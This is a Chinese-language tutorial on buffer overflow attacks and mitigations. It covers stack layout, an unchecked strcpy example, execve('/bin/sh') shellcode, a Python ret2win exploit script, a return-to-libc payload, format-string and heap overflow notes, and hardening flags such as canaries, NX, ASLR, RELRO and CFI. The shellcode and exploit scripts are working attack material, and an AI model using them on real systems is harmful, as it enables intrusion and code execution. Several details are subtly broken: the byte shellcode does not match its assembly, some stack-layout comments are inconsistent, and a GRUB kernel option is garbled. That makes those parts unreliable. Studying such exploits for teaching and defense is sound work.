# 缓冲区溢出攻击原理与防护

缓冲区溢出，这个诞生于 1988 年的漏洞类型，至今仍然是最危险的安全威胁之一。

缓冲区溢出（Buffer Overflow）发生在程序向缓冲区写入的数据超过其容量时，多余的数据会覆盖相邻的内存区域。如果攻击者精心构造这些数据，就能改变程序执行流程，甚至执行任意代码。

## 缓冲区溢出原理

### 内存布局

```c
// 典型栈布局
void vulnerable(char *input) {
    char buffer[64];  // 局部变量缓冲区
    int secret = 0;   // 另一个局部变量
    // 函数调用前，栈布局：
    // [返回地址][旧 RBP][secret][buffer[0-63]]
    // 高地址                    低地址
}
```

### 简单溢出示例

```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    // 没有边界检查，直接复制
    strcpy(buffer, input);
    // 如果 input 超过 64 字节，会覆盖 secret
}

int main() {
    // 正常输入
    vulnerable("Hello");

    // 溢出输入（65 个 A）
    vulnerable("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    // buffer[64-67] 会覆盖 secret，secret 被改写为 0x41414141 ('AAAA')
}
```

### 为什么危险

| 覆盖目标 | 后果 |
|---|---|
| 返回地址 | 控制执行流，跳转到任意代码 |
| 函数指针 | 下次调用时执行攻击者指定的代码 |
| 栈帧指针（EBP） | 破坏栈结构，可能实现代码执行 |
| 其他变量 | 绕过安全检查 |

## 栈溢出利用

### 利用步骤

```
1. 构造恶意输入
   ├── 填充缓冲区（64 字节）
   ├── 覆盖保存的 RBP（8 字节）
   └── 覆盖返回地址（8 字节）→ 指向 shellcode

2. 执行 strcpy（没有边界检查）

3. 函数返回时
   ├── pop 返回地址到 RIP
   └── 跳转到 shellcode 执行
```

### Shellcode

Shellcode 是注入到目标进程的机器码，用于执行 shell 命令：

```asm
; Linux x86_64 execve("/bin/sh") shellcode
section .text
global _start
_start:
    ; rdi = "/bin/sh"
    xor rdx, rdx          ; argv = NULL
    mov qword rdi, 0x68732f6e69622f2f  ; "/bin/sh" (倒序)
    shr rdi, 0x08          ; "/bin/sh" 正确顺序
    push rdi
    mov rdi, rsp           ; rdi = "/bin/sh"

    ; rsi = argv
    push rdx               ; NULL
    mov rsi, rsp           ; rsi = NULL

    ; rax = 59 (sys_execve)
    mov al, 59
    syscall                ; 执行
```

```python
# Python 生成 shellcode
shellcode = b"\x48\x31\xff\x48\x31\xc0\x50\x57\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
```

### 完整利用示例

```c
// 漏洞程序
#include <stdio.h>
#include <string.h>

void win() {
    printf("You win!\n");
    system("/bin/sh");
}

void vulnerable(char *input) {
    char buffer[64];
    // 溢出点
    strcpy(buffer, input);
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}
```

```python
# 利用脚本
#!/usr/bin/env python3
import subprocess
import sys

# 目标地址（win 函数的地址）
WIN_ADDR = 0x401156

# 构造 payload
# 64 字节填充 + 8 字节覆盖 RBP + 8 字节返回地址
payload = b"A" * 64          # 填满 buffer
payload += b"B" * 8          # 覆盖保存的 RBP（不重要）
payload += WIN_ADDR.to_bytes(8, 'little')  # 覆盖返回地址

# 执行
subprocess.run(["./vulnerable", payload])
```

## 现代利用技术

### Return-to-libc

绕过 DEP/NX（数据不可执行）：

```c
// libc 中的有用函数
// system("/bin/sh")  // 执行命令
// execve("/bin/sh", NULL, NULL)  // 替换当前进程
// setuid(0)  // 提升权限
```

```python
# Return-to-libc 攻击
#!/usr/bin/env python3
import subprocess

# libc 函数地址（需要泄漏或猜测）
SYSTEM_ADDR = 0x7ffff7a5c230
BINSH_ADDR = 0x7ffff7b95e5a
EXIT_ADDR = 0x7ffff7a3c9b0

# 构造 ROP 链
# 调用 system("/bin/sh")
payload = b"A" * 72
payload += SYSTEM_ADDR.to_bytes(8, 'little')  # 返回地址
payload += EXIT_ADDR.to_bytes(8, 'little')     # system 的返回地址
payload += BINSH_ADDR.to_bytes(8, 'little')    # system 的参数
```

### Format String 漏洞

```c
// printf 的 format string 漏洞
printf(user_input);  // 危险！
// 如果 user_input 是 "%x %x %x %s"，会泄漏栈内容

// 利用：
// %x - 泄漏栈上的值
// %n - 写入任意地址
```

### Heap 溢出

```c
#include <stdlib.h>

struct {
    void (*func)(void);
} item;

void admin() {
    printf("Admin mode enabled\n");
}

void user() {
    printf("User mode\n");
}

int main() {
    item.func = user;
    // 如果这里有溢出覆盖 func 指针
    // 可以让 item.func = admin;
}
```

## 内存保护机制

### ASLR（地址空间布局随机化）

```bash
# 启用 ASLR
echo 2 > /proc/sys/kernel/randomize_va_space

# 0 = 关闭
# 1 = 只随机化堆和栈
# 2 = 完全随机化（堆、栈、共享库、VDSS）
```

```python
# ASLR 下的利用方法
# 1. 信息泄漏：利用 format string 泄漏 libc 地址
# 2. 暴力破解：部分地址已知（如后 12 位固定）
# 3. 喷射技术：喷射大量 shellcode 提高命中率
```

### DEP/NX（数据执行保护）

```bash
# 编译时启用 NX
gcc -z execstack -o vuln vuln.c  # 禁用 NX（漏洞程序）
gcc -z noexecstack -o safe safe.c  # 启用 NX（安全）
```

### Stack Canary（栈保护）

```c
// GCC 编译器自动插入 canary
void vulnerable(char *input) {
    char buffer[64];
    // GCC 自动添加：
    // canary = get_tcb();
    // strcpy(buffer, input);
    // if (canary != get_tcb()) __stack_chk_fail();
}
```

```bash
# 编译时禁用/启用 canary
gcc -fno-stack-protector -o vuln vuln.c  # 禁用
gcc -fstack-protector-strong -o safe safe.c  # 启用
```

### CFI（控制流完整性）

```bash
# Clang CFI
clang -fsanitize=cfi -o binary source.c
# 验证间接调用和跳转的目标是否合法
```

### RELRO（重定位只读）

```bash
# 编译时启用完整 RELRO
gcc -Wl,-z,relro,-z,now -o safe safe.c
# Partial RELRO：部分区域只读
# Full RELRO：全部 GOT 只读，无法 GOT hijacking
```

## 防御策略

### 1. 安全编码

```c
// 正确的做法：使用安全函数
void safe_copy(char *input) {
    char buffer[64];
    // 使用 strncpy 限制长度
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';

    // 或使用 snprintf
    snprintf(buffer, sizeof(buffer), "%s", input);
}
```

### 2. 编译选项

```bash
# 启用所有安全编译选项
gcc -fstack-protector-all \
    -fPIE -pie \
    -Wl,-z,relro,-z,now \
    -D_FORTIFY_SOURCE=2 \
    -o safe_program source.c

# 选项说明：
# -fstack-protector-all: 所有函数启用 stack canary
# -fPIE -pie: 生成位置无关代码
# -Wl,-z,relro,-z,now: 完整 RELRO
# -D_FORTIFY_SOURCE=2: 运行时边界检查
```

### 3. 堆栈保护

```bash
# Linux 内核保护
# /etc/default/grub
GRUB_CMDLINE_LINUX="kernel.panic=oops=panic mitigations=auto"
# 启用 retguard、IBT（间接分支跟踪）
```
